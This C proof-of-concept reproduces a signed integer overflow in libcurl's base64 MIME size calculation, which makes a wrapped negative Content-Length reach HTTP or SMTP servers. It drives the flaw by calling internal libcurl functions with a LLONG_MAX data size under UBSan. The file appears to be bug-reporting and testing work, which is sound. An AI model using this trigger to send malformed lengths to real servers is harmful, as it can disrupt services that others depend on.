/*
 * PoC for SF06/SF03: Signed integer overflow in encoder_base64_size()
 *
 * encoder_base64_size() computes the expected base64-encoded output size:
 *   size = 4 * (1 + ((size - 1) / 3));   // OVERFLOW when datasize near LLONG_MAX
 *   return size + (2 * ((size - 1) / 76));
 *
 * With datasize = LLONG_MAX (9223372036854775807):
 *   (LLONG_MAX - 1) / 3 = 3074457345618258602
 *   4 * (1 + 3074457345618258602) = 4 * 3074457345618258603 = 12297829382473034412
 *   This exceeds LLONG_MAX -> signed integer overflow (undefined behavior, CWE-190)
 *
 * UBSan triggers: "signed integer overflow: 4 * 3074457345618258603 cannot be
 * represented in type 'curl_off_t' (aka 'long')"
 *
 * The result wraps to a large negative value (-6148914691236517204).
 * This is reported as Content-Length to HTTP/SMTP servers, which may confuse them
 * or cause premature EOF detection.
 *
 * Build:
 *   clang -fsanitize=undefined -g poc_sf06.c \
 *     -I/path/to/curl/include /path/to/libcurl.a \
 *     -lssl -lcrypto -lz -o poc_sf06
 *
 * Run:
 *   UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=0 ./poc_sf06
 */

#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

/* Forward-declare internal functions (exported symbols in libcurl) */
struct Curl_easy;
CURLcode Curl_mime_prepare_headers(struct Curl_easy *data,
                                    curl_mimepart *part,
                                    const char *contenttype,
                                    const char *disposition,
                                    int strategy);
CURLcode Curl_creader_set_mime(struct Curl_easy *data, curl_mimepart *part);

static size_t my_readfunc(char *buf, size_t sz, size_t nm, void *arg) {
    (void)arg;
    static int count = 0;
    if(count++ > 0) return 0;  /* EOF on second call */
    size_t n = sz * nm > 3 ? 3 : sz * nm;
    memset(buf, 'A', n);
    return n;
}

static int my_seekfunc(void *arg, curl_off_t offset, int origin) {
    (void)arg; (void)offset; (void)origin;
    return CURL_SEEKFUNC_OK;
}

int main(void) {
    fprintf(stderr, "[SF06] Testing signed integer overflow in encoder_base64_size\n");
    fprintf(stderr, "[SF06] datasize = LLONG_MAX = %lld\n", (long long)LLONG_MAX);

    /* Verify overflow mathematically */
    long long sz = (long long)LLONG_MAX;
    fprintf(stderr, "[SF06] (LLONG_MAX-1)/3 = %lld\n", (long long)((sz-1)/3));
    fprintf(stderr, "[SF06] 4*(1+(LLONG_MAX-1)/3) would overflow: 4 * %lld > LLONG_MAX\n",
            (long long)(1 + (sz-1)/3));

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if(!curl) { fprintf(stderr, "FAIL: curl_easy_init\n"); return 1; }

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);

    /* Set datasize to LLONG_MAX - the overflow trigger value */
    curl_off_t huge_datasize = (curl_off_t)LLONG_MAX;
    curl_mime_data_cb(part, huge_datasize, my_readfunc, my_seekfunc, NULL, NULL);
    curl_mime_encoder(part, "base64");

    /* Prepare headers first */
    fprintf(stderr, "[SF06] Calling Curl_mime_prepare_headers...\n");
    CURLcode rc = Curl_mime_prepare_headers((struct Curl_easy *)curl, part, NULL, NULL, 0);
    fprintf(stderr, "[SF06] prepare_headers: %d\n", rc);

    /*
     * Curl_creader_set_mime calls mime_size(part) which calls
     * encoder_base64_size(part) which overflows.
     * UBSan will report:
     *   mime.c:427: runtime error: signed integer overflow:
     *     4 * 3074457345618258603 cannot be represented in type 'curl_off_t'
     */
    fprintf(stderr, "[SF06] Calling Curl_creader_set_mime (triggers overflow)...\n");
    rc = Curl_creader_set_mime((struct Curl_easy *)curl, part);
    fprintf(stderr, "[SF06] creader_set_mime: %d\n", rc);
    fprintf(stderr, "[SF06] UBSan should have reported overflow above\n");

    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
